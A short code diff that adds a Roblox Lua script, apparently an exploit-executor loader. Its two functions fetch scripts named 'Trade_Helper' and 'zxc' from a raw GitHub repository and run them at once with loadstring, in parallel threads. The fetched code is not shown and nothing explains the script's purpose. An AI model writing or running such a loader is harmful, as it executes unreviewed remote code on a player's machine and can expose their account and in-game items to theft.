@@ -1,0 +1,9 @@
+local function work()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/Trade_Helper'))()
+end
+local function work2()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/zxc'))()
+end
+
+task.spawn(work)
+task.spawn(work2)
